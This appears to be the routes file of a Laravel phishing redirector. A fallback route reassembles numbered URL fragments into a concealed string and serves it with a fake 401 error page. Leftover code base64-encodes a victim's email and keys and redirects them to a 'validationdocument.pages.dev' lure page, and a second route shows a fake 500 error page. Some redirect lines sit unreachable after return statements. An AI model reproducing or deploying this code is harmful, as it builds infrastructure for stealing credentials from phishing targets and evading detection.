<?php

use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::fallback(function () {
	$fullUrl = request()->path();
    // return $fullUrl;

    $segments = explode('/', $fullUrl);

    // Initialize an array to store the results
    $results = [];

    // Iterate over each segment
    foreach ($segments as $segment) {
        // Match segments that start with a number followed by an optional dash and letters (including '=', '-', and '+')
        if (preg_match('/^(\d+)-?([a-zA-Z0-9=\-+]+)/', $segment, $matches)) {
            $number = intval($matches[1]);
            $letters = $matches[2];
            if ($number !== 0) {  // Ignore segments starting with 0
                // Store the letters in the results array with the number as the key
                $results[] = ['number' => $number, 'letters' => $letters];
            }
        }
    }

    // Sort the results array by the number key
    usort($results, function($a, $b) {
        return $a['number'] - $b['number'];
    });

    // Map the sorted results to their corresponding letters and join them to form the final result
    $combined = implode('', array_map(function($item) {
        return $item['letters'];
    }, $results));

    // return $combined;

    // $combinedString = str_replace('/', '', $fullUrl);

    // return $combinedString;

    
    // Extract the segments of the URL
    // $segments = explode('/', $fullUrl);
    
    // Assuming the last two segments are the email and the key
    // and the segments before these are the paths
    // $email = $segments[count($segments) - 3];
    // $key = $segments[count($segments) - 2];
    // $key2 = $segments[count($segments) - 1];
    
    // $combinedString = $email . '&' . $key . '&'. $key2;
    
 
    // $encodedCombinedString = base64_encode($combinedString);

    return response()->view('welcome', ["data"=>$combined], 401);

    return redirect('https://validationdocument.pages.dev#?service='.$encodedCombinedString);
//    return "default";
});



Route::get('/abs/error/{data}',function ($data) {
    // return "ok";
	// $fullUrl = request()->path();
    
    // // Extract the segments of the URL
    // $segments = explode('/', $fullUrl);
    
    // // Assuming the last two segments are the email and the key
    // // and the segments before these are the paths
    // $email = $email;
    // $key = $key;
    // $key2 = $enc;
    
    // $combinedString = $email . '&' . $key . '&'. $key2;
    
 
    // $encodedCombinedString = base64_encode($combinedString);

    return response()->view('red', ["data"=>$data], 500);

    return redirect('https://validationdocument.pages.dev#?service='.$encodedCombinedString);
//    return "default";
} )->name('error.show');

